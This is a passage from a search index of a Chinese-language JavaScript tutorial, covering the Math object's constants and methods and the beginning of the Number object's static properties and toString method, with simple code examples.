Math . LOG2E // 1.4426950408889634 Math . LOG10E // 0.4342944819032518 Math . PI // 3.141592653589793 Math . SQRT1_2 // 0.7071067811865476 Math . SQRT2 // 1.4142135623730951 \u8fd9\u4e9b\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u7684\uff0c\u4e0d\u80fd\u4fee\u6539\u3002 \u9759\u6001\u65b9\u6cd5 \u00b6 Math \u5bf9\u8c61\u63d0\u4f9b\u4ee5\u4e0b\u4e00\u4e9b\u9759\u6001\u65b9\u6cd5\u3002 Math.abs() \uff1a\u7edd\u5bf9\u503c Math.ceil() \uff1a\u5411\u4e0a\u53d6\u6574 Math.floor() \uff1a\u5411\u4e0b\u53d6\u6574 Math.max() \uff1a\u6700\u5927\u503c Math.min() \uff1a\u6700\u5c0f\u503c Math.pow() \uff1a\u5e42\u8fd0\u7b97 Math.sqrt() \uff1a\u5e73\u65b9\u6839 Math.log() \uff1a\u81ea\u7136\u5bf9\u6570 Math.exp() \uff1a e \u7684\u6307\u6570 Math.round() \uff1a\u56db\u820d\u4e94\u5165 Math.random() \uff1a\u968f\u673a\u6570 Math.abs() \u00b6 Math.abs \u65b9\u6cd5\u8fd4\u56de\u53c2\u6570\u503c\u7684\u7edd\u5bf9\u503c\u3002 1 2 Math . abs ( 1 ) // 1 Math . abs ( - 1 ) // 1 Math.max()\uff0cMath.min() \u00b6 Math.max \u65b9\u6cd5\u8fd4\u56de\u53c2\u6570\u4e4b\u4e2d\u6700\u5927\u7684\u90a3\u4e2a\u503c\uff0c Math.min \u8fd4\u56de\u6700\u5c0f\u7684\u90a3\u4e2a\u503c\u3002\u5982\u679c\u53c2\u6570\u4e3a\u7a7a, Math.min \u8fd4\u56de Infinity , Math.max \u8fd4\u56de -Infinity \u3002 1 2 3 4 Math . max ( 2 , - 1 , 5 ) // 5 Math . min ( 2 , - 1 , 5 ) // -1 Math . min () // Infinity Math . max () // -Infinity Math.floor()\uff0cMath.ceil() \u00b6 Math.floor \u65b9\u6cd5\u8fd4\u56de\u5c0f\u4e8e\u6216\u7b49\u4e8e\u53c2\u6570\u503c\u7684\u6700\u5927\u6574\u6570\uff08\u5730\u677f\u503c\uff09\u3002 1 2 Math . floor ( 3.2 ) // 3 Math . floor ( - 3.2 ) // -4 Math.ceil \u65b9\u6cd5\u8fd4\u56de\u5927\u4e8e\u6216\u7b49\u4e8e\u53c2\u6570\u503c\u7684\u6700\u5c0f\u6574\u6570\uff08\u5929\u82b1\u677f\u503c\uff09\u3002 1 2 Math . ceil ( 3.2 ) // 4 Math . ceil ( - 3.2 ) // -3 \u8fd9\u4e24\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u7ed3\u5408\u8d77\u6765\uff0c\u5b9e\u73b0\u4e00\u4e2a\u603b\u662f\u8fd4\u56de\u6570\u503c\u7684\u6574\u6570\u90e8\u5206\u7684\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 function ToInteger ( x ) { x = Number ( x ); return x < 0 ? Math . ceil ( x ) : Math . floor ( x ); } ToInteger ( 3.2 ) // 3 ToInteger ( 3.5 ) // 3 ToInteger ( 3.8 ) // 3 ToInteger ( - 3.2 ) // -3 ToInteger ( - 3.5 ) // -3 ToInteger ( - 3.8 ) // -3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e0d\u7ba1\u6b63\u6570\u6216\u8d1f\u6570\uff0c ToInteger \u51fd\u6570\u603b\u662f\u8fd4\u56de\u4e00\u4e2a\u6570\u503c\u7684\u6574\u6570\u90e8\u5206\u3002 Math.round() \u00b6 Math.round \u65b9\u6cd5\u7528\u4e8e\u56db\u820d\u4e94\u5165\u3002 1 2 3 4 5 6 Math . round ( 0.1 ) // 0 Math . round ( 0.5 ) // 1 Math . round ( 0.6 ) // 1 // \u7b49\u540c\u4e8e Math . floor ( x + 0.5 ) \u6ce8\u610f\uff0c\u5b83\u5bf9\u8d1f\u6570\u7684\u5904\u7406\uff08\u4e3b\u8981\u662f\u5bf9 0.5 \u7684\u5904\u7406\uff09\u3002 1 2 3 Math . round ( - 1.1 ) // -1 Math . round ( - 1.5 ) // -1 Math . round ( - 1.6 ) // -2 Math.pow() \u00b6 Math.pow \u65b9\u6cd5\u8fd4\u56de\u4ee5\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5e95\u6570\u3001\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u6307\u6570\u7684\u5e42\u8fd0\u7b97\u503c\u3002 1 2 3 4 // \u7b49\u540c\u4e8e 2 ** 2 Math . pow ( 2 , 2 ) // 4 // \u7b49\u540c\u4e8e 2 ** 3 Math . pow ( 2 , 3 ) // 8 \u4e0b\u9762\u662f\u8ba1\u7b97\u5706\u9762\u79ef\u7684\u65b9\u6cd5\u3002 1 2 var radius = 20 ; var area = Math . PI * Math . pow ( radius , 2 ); Math.sqrt() \u00b6 Math.sqrt \u65b9\u6cd5\u8fd4\u56de\u53c2\u6570\u503c\u7684\u5e73\u65b9\u6839\u3002\u5982\u679c\u53c2\u6570\u662f\u4e00\u4e2a\u8d1f\u503c\uff0c\u5219\u8fd4\u56de NaN \u3002 1 2 Math . sqrt ( 4 ) // 2 Math . sqrt ( - 4 ) // NaN Math.log() \u00b6 Math.log \u65b9\u6cd5\u8fd4\u56de\u4ee5 e \u4e3a\u5e95\u7684\u81ea\u7136\u5bf9\u6570\u503c\u3002 1 2 Math . log ( Math . E ) // 1 Math . log ( 10 ) // 2.302585092994046 \u5982\u679c\u8981\u8ba1\u7b97\u4ee510\u4e3a\u5e95\u7684\u5bf9\u6570\uff0c\u53ef\u4ee5\u5148\u7528 Math.log \u6c42\u51fa\u81ea\u7136\u5bf9\u6570\uff0c\u7136\u540e\u9664\u4ee5 Math.LN10 \uff1b\u6c42\u4ee52\u4e3a\u5e95\u7684\u5bf9\u6570\uff0c\u53ef\u4ee5\u9664\u4ee5 Math.LN2 \u3002 1 2 Math . log ( 100 ) / Math . LN10 // 2 Math . log ( 8 ) / Math . LN2 // 3 Math.exp() \u00b6 Math.exp \u65b9\u6cd5\u8fd4\u56de\u5e38\u6570 e \u7684\u53c2\u6570\u6b21\u65b9\u3002 1 2 Math . exp ( 1 ) // 2.718281828459045 Math . exp ( 3 ) // 20.085536923187668 Math.random() \u00b6 Math.random() \u8fd4\u56de0\u52301\u4e4b\u95f4\u7684\u4e00\u4e2a\u4f2a\u968f\u673a\u6570\uff0c\u53ef\u80fd\u7b49\u4e8e0\uff0c\u4f46\u662f\u4e00\u5b9a\u5c0f\u4e8e1\u3002 1 Math . random () // 0.7151307314634323 \u4efb\u610f\u8303\u56f4\u7684\u968f\u673a\u6570\u751f\u6210\u51fd\u6570\u5982\u4e0b\u3002 1 2 3 4 5 6 function getRandomArbitrary ( min , max ) { return Math . random () * ( max - min ) + min ; } getRandomArbitrary ( 1.5 , 6.5 ) // 2.4942810038223864 \u4efb\u610f\u8303\u56f4\u7684\u968f\u673a\u6574\u6570\u751f\u6210\u51fd\u6570\u5982\u4e0b\u3002 1 2 3 4 5 function getRandomInt ( min , max ) { return Math . floor ( Math . random () * ( max - min + 1 )) + min ; } getRandomInt ( 1 , 6 ) // 5 \u8fd4\u56de\u968f\u673a\u5b57\u7b26\u7684\u4f8b\u5b50\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 function random_str ( length ) { var ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' ; ALPHABET += 'abcdefghijklmnopqrstuvwxyz' ; ALPHABET += '0123456789-_' ; var str = '' ; for ( var i = 0 ; i < length ; ++ i ) { var rand = Math . floor ( Math . random () * ALPHABET . length ); str += ALPHABET . substring ( rand , rand + 1 ); } return str ; } random_str ( 6 ) // \"NdQKOr\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c random_str \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u53d8\u91cf ALPHABET \u5185\u7684\u968f\u673a\u5b57\u7b26\u6240\u7ec4\u6210\u7684\u6307\u5b9a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u3002 \u4e09\u89d2\u51fd\u6570\u65b9\u6cd5 \u00b6 Math \u5bf9\u8c61\u8fd8\u63d0\u4f9b\u4e00\u7cfb\u5217\u4e09\u89d2\u51fd\u6570\u65b9\u6cd5\u3002 Math.sin() \uff1a\u8fd4\u56de\u53c2\u6570\u7684\u6b63\u5f26\uff08\u53c2\u6570\u4e3a\u5f27\u5ea6\u503c\uff09 Math.cos() \uff1a\u8fd4\u56de\u53c2\u6570\u7684\u4f59\u5f26\uff08\u53c2\u6570\u4e3a\u5f27\u5ea6\u503c\uff09 Math.tan() \uff1a\u8fd4\u56de\u53c2\u6570\u7684\u6b63\u5207\uff08\u53c2\u6570\u4e3a\u5f27\u5ea6\u503c\uff09 Math.asin() \uff1a\u8fd4\u56de\u53c2\u6570\u7684\u53cd\u6b63\u5f26\uff08\u8fd4\u56de\u503c\u4e3a\u5f27\u5ea6\u503c\uff09 Math.acos() \uff1a\u8fd4\u56de\u53c2\u6570\u7684\u53cd\u4f59\u5f26\uff08\u8fd4\u56de\u503c\u4e3a\u5f27\u5ea6\u503c\uff09 Math.atan() \uff1a\u8fd4\u56de\u53c2\u6570\u7684\u53cd\u6b63\u5207\uff08\u8fd4\u56de\u503c\u4e3a\u5f27\u5ea6\u503c\uff09 1 2 3 4 5 6 7 8 9 Math . sin ( 0 ) // 0 Math . cos ( 0 ) // 1 Math . tan ( 0 ) // 0 Math . sin ( Math . PI / 2 ) // 1 Math . asin ( 1 ) // 1.5707963267948966 Math . acos ( 1 ) // 0 Math . atan ( 1 ) // 0.7853981633974483","title":"Math \u5bf9\u8c61"},{"location":"stdlib/math/#math","text":"Math \u662f JavaScript \u7684\u539f\u751f\u5bf9\u8c61\uff0c\u63d0\u4f9b\u5404\u79cd\u6570\u5b66\u529f\u80fd\u3002\u8be5\u5bf9\u8c61\u4e0d\u662f\u6784\u9020\u51fd\u6570\uff0c\u4e0d\u80fd\u751f\u6210\u5b9e\u4f8b\uff0c\u6240\u6709\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u90fd\u5fc5\u987b\u5728 Math \u5bf9\u8c61\u4e0a\u8c03\u7528\u3002","title":"Math \u5bf9\u8c61"},{"location":"stdlib/math/#_1","text":"Math \u5bf9\u8c61\u7684\u9759\u6001\u5c5e\u6027\uff0c\u63d0\u4f9b\u4ee5\u4e0b\u4e00\u4e9b\u6570\u5b66\u5e38\u6570\u3002 Math.E \uff1a\u5e38\u6570 e \u3002 Math.LN2 \uff1a2 \u7684\u81ea\u7136\u5bf9\u6570\u3002 Math.LN10 \uff1a10 \u7684\u81ea\u7136\u5bf9\u6570\u3002 Math.LOG2E \uff1a\u4ee5 2 \u4e3a\u5e95\u7684 e \u7684\u5bf9\u6570\u3002 Math.LOG10E \uff1a\u4ee5 10 \u4e3a\u5e95\u7684 e \u7684\u5bf9\u6570\u3002 Math.PI \uff1a\u5e38\u6570 \u03c0 \u3002 Math.SQRT1_2 \uff1a0.5 \u7684\u5e73\u65b9\u6839\u3002 Math.SQRT2 \uff1a2 \u7684\u5e73\u65b9\u6839\u3002 1 2 3 4 5 6 7 8 Math . E // 2.718281828459045 Math . LN2 // 0.6931471805599453 Math . LN10 // 2.302585092994046 Math . LOG2E // 1.4426950408889634 Math . LOG10E // 0.4342944819032518 Math . PI // 3.141592653589793 Math . SQRT1_2 // 0.7071067811865476 Math . SQRT2 // 1.4142135623730951 \u8fd9\u4e9b\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u7684\uff0c\u4e0d\u80fd\u4fee\u6539\u3002","title":"\u9759\u6001\u5c5e\u6027"},{"location":"stdlib/math/#_2","text":"Math \u5bf9\u8c61\u63d0\u4f9b\u4ee5\u4e0b\u4e00\u4e9b\u9759\u6001\u65b9\u6cd5\u3002 Math.abs() \uff1a\u7edd\u5bf9\u503c Math.ceil() \uff1a\u5411\u4e0a\u53d6\u6574 Math.floor() \uff1a\u5411\u4e0b\u53d6\u6574 Math.max() \uff1a\u6700\u5927\u503c Math.min() \uff1a\u6700\u5c0f\u503c Math.pow() \uff1a\u5e42\u8fd0\u7b97 Math.sqrt() \uff1a\u5e73\u65b9\u6839 Math.log() \uff1a\u81ea\u7136\u5bf9\u6570 Math.exp() \uff1a e \u7684\u6307\u6570 Math.round() \uff1a\u56db\u820d\u4e94\u5165 Math.random() \uff1a\u968f\u673a\u6570","title":"\u9759\u6001\u65b9\u6cd5"},{"location":"stdlib/math/#mathabs","text":"Math.abs \u65b9\u6cd5\u8fd4\u56de\u53c2\u6570\u503c\u7684\u7edd\u5bf9\u503c\u3002 1 2 Math . abs ( 1 ) // 1 Math . abs ( - 1 ) // 1","title":"Math.abs()"},{"location":"stdlib/math/#mathmaxmathmin","text":"Math.max \u65b9\u6cd5\u8fd4\u56de\u53c2\u6570\u4e4b\u4e2d\u6700\u5927\u7684\u90a3\u4e2a\u503c\uff0c Math.min \u8fd4\u56de\u6700\u5c0f\u7684\u90a3\u4e2a\u503c\u3002\u5982\u679c\u53c2\u6570\u4e3a\u7a7a, Math.min \u8fd4\u56de Infinity , Math.max \u8fd4\u56de -Infinity \u3002 1 2 3 4 Math . max ( 2 , - 1 , 5 ) // 5 Math . min ( 2 , - 1 , 5 ) // -1 Math . min () // Infinity Math . max () // -Infinity","title":"Math.max()\uff0cMath.min()"},{"location":"stdlib/math/#mathfloormathceil","text":"Math.floor \u65b9\u6cd5\u8fd4\u56de\u5c0f\u4e8e\u6216\u7b49\u4e8e\u53c2\u6570\u503c\u7684\u6700\u5927\u6574\u6570\uff08\u5730\u677f\u503c\uff09\u3002 1 2 Math . floor ( 3.2 ) // 3 Math . floor ( - 3.2 ) // -4 Math.ceil \u65b9\u6cd5\u8fd4\u56de\u5927\u4e8e\u6216\u7b49\u4e8e\u53c2\u6570\u503c\u7684\u6700\u5c0f\u6574\u6570\uff08\u5929\u82b1\u677f\u503c\uff09\u3002 1 2 Math . ceil ( 3.2 ) // 4 Math . ceil ( - 3.2 ) // -3 \u8fd9\u4e24\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u7ed3\u5408\u8d77\u6765\uff0c\u5b9e\u73b0\u4e00\u4e2a\u603b\u662f\u8fd4\u56de\u6570\u503c\u7684\u6574\u6570\u90e8\u5206\u7684\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 function ToInteger ( x ) { x = Number ( x ); return x < 0 ? Math . ceil ( x ) : Math . floor ( x ); } ToInteger ( 3.2 ) // 3 ToInteger ( 3.5 ) // 3 ToInteger ( 3.8 ) // 3 ToInteger ( - 3.2 ) // -3 ToInteger ( - 3.5 ) // -3 ToInteger ( - 3.8 ) // -3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e0d\u7ba1\u6b63\u6570\u6216\u8d1f\u6570\uff0c ToInteger \u51fd\u6570\u603b\u662f\u8fd4\u56de\u4e00\u4e2a\u6570\u503c\u7684\u6574\u6570\u90e8\u5206\u3002","title":"Math.floor()\uff0cMath.ceil()"},{"location":"stdlib/math/#mathround","text":"Math.round \u65b9\u6cd5\u7528\u4e8e\u56db\u820d\u4e94\u5165\u3002 1 2 3 4 5 6 Math . round ( 0.1 ) // 0 Math . round ( 0.5 ) // 1 Math . round ( 0.6 ) // 1 // \u7b49\u540c\u4e8e Math . floor ( x + 0.5 ) \u6ce8\u610f\uff0c\u5b83\u5bf9\u8d1f\u6570\u7684\u5904\u7406\uff08\u4e3b\u8981\u662f\u5bf9 0.5 \u7684\u5904\u7406\uff09\u3002 1 2 3 Math . round ( - 1.1 ) // -1 Math . round ( - 1.5 ) // -1 Math . round ( - 1.6 ) // -2","title":"Math.round()"},{"location":"stdlib/math/#mathpow","text":"Math.pow \u65b9\u6cd5\u8fd4\u56de\u4ee5\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5e95\u6570\u3001\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u6307\u6570\u7684\u5e42\u8fd0\u7b97\u503c\u3002 1 2 3 4 // \u7b49\u540c\u4e8e 2 ** 2 Math . pow ( 2 , 2 ) // 4 // \u7b49\u540c\u4e8e 2 ** 3 Math . pow ( 2 , 3 ) // 8 \u4e0b\u9762\u662f\u8ba1\u7b97\u5706\u9762\u79ef\u7684\u65b9\u6cd5\u3002 1 2 var radius = 20 ; var area = Math . PI * Math . pow ( radius , 2 );","title":"Math.pow()"},{"location":"stdlib/math/#mathsqrt","text":"Math.sqrt \u65b9\u6cd5\u8fd4\u56de\u53c2\u6570\u503c\u7684\u5e73\u65b9\u6839\u3002\u5982\u679c\u53c2\u6570\u662f\u4e00\u4e2a\u8d1f\u503c\uff0c\u5219\u8fd4\u56de NaN \u3002 1 2 Math . sqrt ( 4 ) // 2 Math . sqrt ( - 4 ) // NaN","title":"Math.sqrt()"},{"location":"stdlib/math/#mathlog","text":"Math.log \u65b9\u6cd5\u8fd4\u56de\u4ee5 e \u4e3a\u5e95\u7684\u81ea\u7136\u5bf9\u6570\u503c\u3002 1 2 Math . log ( Math . E ) // 1 Math . log ( 10 ) // 2.302585092994046 \u5982\u679c\u8981\u8ba1\u7b97\u4ee510\u4e3a\u5e95\u7684\u5bf9\u6570\uff0c\u53ef\u4ee5\u5148\u7528 Math.log \u6c42\u51fa\u81ea\u7136\u5bf9\u6570\uff0c\u7136\u540e\u9664\u4ee5 Math.LN10 \uff1b\u6c42\u4ee52\u4e3a\u5e95\u7684\u5bf9\u6570\uff0c\u53ef\u4ee5\u9664\u4ee5 Math.LN2 \u3002 1 2 Math . log ( 100 ) / Math . LN10 // 2 Math . log ( 8 ) / Math . LN2 // 3","title":"Math.log()"},{"location":"stdlib/math/#mathexp","text":"Math.exp \u65b9\u6cd5\u8fd4\u56de\u5e38\u6570 e \u7684\u53c2\u6570\u6b21\u65b9\u3002 1 2 Math . exp ( 1 ) // 2.718281828459045 Math . exp ( 3 ) // 20.085536923187668","title":"Math.exp()"},{"location":"stdlib/math/#mathrandom","text":"Math.random() \u8fd4\u56de0\u52301\u4e4b\u95f4\u7684\u4e00\u4e2a\u4f2a\u968f\u673a\u6570\uff0c\u53ef\u80fd\u7b49\u4e8e0\uff0c\u4f46\u662f\u4e00\u5b9a\u5c0f\u4e8e1\u3002 1 Math . random () // 0.7151307314634323 \u4efb\u610f\u8303\u56f4\u7684\u968f\u673a\u6570\u751f\u6210\u51fd\u6570\u5982\u4e0b\u3002 1 2 3 4 5 6 function getRandomArbitrary ( min , max ) { return Math . random () * ( max - min ) + min ; } getRandomArbitrary ( 1.5 , 6.5 ) // 2.4942810038223864 \u4efb\u610f\u8303\u56f4\u7684\u968f\u673a\u6574\u6570\u751f\u6210\u51fd\u6570\u5982\u4e0b\u3002 1 2 3 4 5 function getRandomInt ( min , max ) { return Math . floor ( Math . random () * ( max - min + 1 )) + min ; } getRandomInt ( 1 , 6 ) // 5 \u8fd4\u56de\u968f\u673a\u5b57\u7b26\u7684\u4f8b\u5b50\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 function random_str ( length ) { var ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' ; ALPHABET += 'abcdefghijklmnopqrstuvwxyz' ; ALPHABET += '0123456789-_' ; var str = '' ; for ( var i = 0 ; i < length ; ++ i ) { var rand = Math . floor ( Math . random () * ALPHABET . length ); str += ALPHABET . substring ( rand , rand + 1 ); } return str ; } random_str ( 6 ) // \"NdQKOr\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c random_str \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u53d8\u91cf ALPHABET \u5185\u7684\u968f\u673a\u5b57\u7b26\u6240\u7ec4\u6210\u7684\u6307\u5b9a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u3002","title":"Math.random()"},{"location":"stdlib/math/#_3","text":"Math \u5bf9\u8c61\u8fd8\u63d0\u4f9b\u4e00\u7cfb\u5217\u4e09\u89d2\u51fd\u6570\u65b9\u6cd5\u3002 Math.sin() \uff1a\u8fd4\u56de\u53c2\u6570\u7684\u6b63\u5f26\uff08\u53c2\u6570\u4e3a\u5f27\u5ea6\u503c\uff09 Math.cos() \uff1a\u8fd4\u56de\u53c2\u6570\u7684\u4f59\u5f26\uff08\u53c2\u6570\u4e3a\u5f27\u5ea6\u503c\uff09 Math.tan() \uff1a\u8fd4\u56de\u53c2\u6570\u7684\u6b63\u5207\uff08\u53c2\u6570\u4e3a\u5f27\u5ea6\u503c\uff09 Math.asin() \uff1a\u8fd4\u56de\u53c2\u6570\u7684\u53cd\u6b63\u5f26\uff08\u8fd4\u56de\u503c\u4e3a\u5f27\u5ea6\u503c\uff09 Math.acos() \uff1a\u8fd4\u56de\u53c2\u6570\u7684\u53cd\u4f59\u5f26\uff08\u8fd4\u56de\u503c\u4e3a\u5f27\u5ea6\u503c\uff09 Math.atan() \uff1a\u8fd4\u56de\u53c2\u6570\u7684\u53cd\u6b63\u5207\uff08\u8fd4\u56de\u503c\u4e3a\u5f27\u5ea6\u503c\uff09 1 2 3 4 5 6 7 8 9 Math . sin ( 0 ) // 0 Math . cos ( 0 ) // 1 Math . tan ( 0 ) // 0 Math . sin ( Math . PI / 2 ) // 1 Math . asin ( 1 ) // 1.5707963267948966 Math . acos ( 1 ) // 0 Math . atan ( 1 ) // 0.7853981633974483","title":"\u4e09\u89d2\u51fd\u6570\u65b9\u6cd5"},{"location":"stdlib/number/","text":"Number \u5bf9\u8c61 \u00b6 \u6982\u8ff0 \u00b6 Number \u5bf9\u8c61\u662f\u6570\u503c\u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u5de5\u5177\u51fd\u6570\u4f7f\u7528\u3002 \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u65f6\uff0c\u5b83\u7528\u4e8e\u751f\u6210\u503c\u4e3a\u6570\u503c\u7684\u5bf9\u8c61\u3002 1 2 var n = new Number ( 1 ); typeof n // \"object\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Number \u5bf9\u8c61\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u4f7f\u7528\uff0c\u8fd4\u56de\u4e00\u4e2a\u503c\u4e3a 1 \u7684\u5bf9\u8c61\u3002 \u4f5c\u4e3a\u5de5\u5177\u51fd\u6570\u65f6\uff0c\u5b83\u53ef\u4ee5\u5c06\u4efb\u4f55\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u6570\u503c\u3002 1 Number ( true ) // 1 \u4e0a\u9762\u4ee3\u7801\u5c06\u5e03\u5c14\u503c true \u8f6c\u4e3a\u6570\u503c 1 \u3002 Number \u4f5c\u4e3a\u5de5\u5177\u51fd\u6570\u7684\u7528\u6cd5\uff0c\u8be6\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\u3002 \u9759\u6001\u5c5e\u6027 \u00b6 Number \u5bf9\u8c61\u62e5\u6709\u4ee5\u4e0b\u4e00\u4e9b\u9759\u6001\u5c5e\u6027\uff08\u5373\u76f4\u63a5\u5b9a\u4e49\u5728 Number \u5bf9\u8c61\u4e0a\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u662f\u5b9a\u4e49\u5728\u5b9e\u4f8b\u4e0a\u7684\u5c5e\u6027\uff09\u3002 Number.POSITIVE_INFINITY \uff1a\u6b63\u7684\u65e0\u9650\uff0c\u6307\u5411 Infinity \u3002 Number.NEGATIVE_INFINITY \uff1a\u8d1f\u7684\u65e0\u9650\uff0c\u6307\u5411 -Infinity \u3002 Number.NaN \uff1a\u8868\u793a\u975e\u6570\u503c\uff0c\u6307\u5411 NaN \u3002 Number.MIN_VALUE \uff1a\u8868\u793a\u6700\u5c0f\u7684\u6b63\u6570\uff08\u5373\u6700\u63a5\u8fd10\u7684\u6b63\u6570\uff0c\u572864\u4f4d\u6d6e\u70b9\u6570\u4f53\u7cfb\u4e2d\u4e3a 5e-324 \uff09\uff0c\u76f8\u5e94\u7684\uff0c\u6700\u63a5\u8fd10\u7684\u8d1f\u6570\u4e3a -Number.MIN_VALUE \u3002 Number.MAX_SAFE_INTEGER \uff1a\u8868\u793a\u80fd\u591f\u7cbe\u786e\u8868\u793a\u7684\u6700\u5927\u6574\u6570\uff0c\u5373 9007199254740991 \u3002 Number.MIN_SAFE_INTEGER \uff1a\u8868\u793a\u80fd\u591f\u7cbe\u786e\u8868\u793a\u7684\u6700\u5c0f\u6574\u6570\uff0c\u5373 -9007199254740991 \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Number . POSITIVE_INFINITY // Infinity Number . NEGATIVE_INFINITY // -Infinity Number . NaN // NaN Number . MAX_VALUE // 1.7976931348623157e+308 Number . MAX_VALUE < Infinity // true Number . MIN_VALUE // 5e-324 Number . MIN_VALUE > 0 // true Number . MAX_SAFE_INTEGER // 9007199254740991 Number . MIN_SAFE_INTEGER // -9007199254740991 \u5b9e\u4f8b\u65b9\u6cd5 \u00b6 Number \u5bf9\u8c61\u67094\u4e2a\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u90fd\u8ddf\u5c06\u6570\u503c\u8f6c\u6362\u6210\u6307\u5b9a\u683c\u5f0f\u6709\u5173\u3002 Number.prototype.toString() \u00b6 Number \u5bf9\u8c61\u90e8\u7f72\u4e86\u81ea\u5df1\u7684 toString \u65b9\u6cd5\uff0c\u7528\u6765\u5c06\u4e00\u4e2a\u6570\u503c\u8f6c\u4e3a\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 ( 10 ). toString () // \"10\" toString \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u8f93\u51fa\u7684\u8fdb\u5236\u3002\u5982\u679c\u7701\u7565\u8fd9\u4e2a\u53c2\u6570\uff0c\u9ed8\u8ba4\u5c06\u6570\u503c\u5148\u8f6c\u4e3a\u5341\u8fdb\u5236\uff0c\u518d\u8f93\u51fa\u5b57\u7b26\u4e32\uff1b\u5426\u5219\uff0c\u5c31\u6839\u636e\u53c2\u6570\u6307\u5b9a\u7684\u8fdb\u5236\uff0c\u5c06\u4e00\u4e2a\u6570\u5b57\u8f6c\u5316\u6210\u67d0\u4e2a\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u3002 1 2 3 ( 10 ). toString ( 2 ) // \"1010\" ( 10 ). toString ( 8 ) // \"12\" ( 10 ). toString ( 16 ) // \"a\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c 10 \u4e00\u5b9a\u8981\u653e\u5728\u62ec\u53f7\u91cc\uff0c\u8fd9\u6837\u8868\u660e\u540e\u9762\u7684\u70b9\u8868\u793a\u8c03\u7528\u5bf9\u8c61\u5c5e\u6027\u3002\u5982\u679c\u4e0d\u52a0\u62ec\u53f7\uff0c\u8fd9\u4e2a\u70b9\u4f1a\u88ab JavaScript \u5f15\u64ce\u89e3\u91ca\u6210\u5c0f\u6570\u70b9\uff0c\u4ece\u800c\u62a5\u9519\u3002 1 2 10. toString ( 2 ) // SyntaxError: Unexpected token ILLEGAL \u53ea\u8981\u80fd\u591f\u8ba9 JavaScript \u5f15\u64ce\u4e0d\u6df7\u6dc6\u5c0f\u6570\u70b9\u548c\u5bf9\u8c61\u7684\u70b9\u8fd0\u7b97\u7b26\uff0c\u5404\u79cd\u5199\u6cd5\u90fd\u80fd\u7528\u3002\u9664\u4e86\u4e3a 10 \u52a0\u4e0a\u62ec\u53f7\uff0c\u8fd8\u53ef\u4ee5\u5728 10 \u540e\u9762\u52a0\u4e24\u4e2a\u70b9\uff0cJavaScript \u4f1a\u628a\u7b2c\u4e00\u4e2a\u70b9\u7406\u89e3\u6210\u5c0f\u6570\u70b9\uff08\u5373 10.0 \uff09\uff0c\u628a\u7b2c\u4e8c\u4e2a\u70b9\u7406\u89e3\u6210\u8c03\u7528\u5bf9\u8c61\u5c5e\u6027\uff0c\u4ece\u800c\u5f97\u5230\u6b63\u786e\u7ed3\u679c\u3002 1 2 3 4 5 6 10. . toString ( 2 ) // \"1010\" // \u5176\u4ed6\u65b9\u6cd5\u8fd8\u5305\u62ec 10 . toString ( 2 ) // \"1010\" 10.0 . toString ( 2 ) // \"1010\" \u8fd9\u5b9e\u9645\u4e0a\u610f\u5473\u7740\uff0c\u53ef\u4ee5\u76f4\u63a5\u5bf9\u4e00\u4e2a\u5c0f\u6570\u4f7f\u7528 toString \u65b9\u6cd5\u3002 1 2 3 4 10.5 . toString () // \"10.5\" 10.5 . toString ( 2 ) // \"1010.1\" 10.5 . toString ( 8 ) // \"12.4\" 10.5 . toString ( 16 ) // \"a.8\" \u901a\u8fc7\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u4e5f\u53ef\u4ee5\u8c03\u7528 toString \u65b9\u6cd5\u3002 1 10 [ 'toString' ]( 2 ) // \"1010\" toString \u65b9\u6cd5\u53ea\u80fd\u5c06\u5341\u8fdb\u5236\u7684\u6570\uff0c\u8f6c\u4e3a\u5176\u4ed6\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u3002\u5982\u679c\u8981\u5c06\u5176\u4ed6\u8fdb\u5236\u7684\u6570\uff0c\u8f6c\u56de\u5341\u8fdb\u5236\uff0c\u9700\u8981\u4f7f\u7528 parseInt \u65b9\u6cd5\u3002 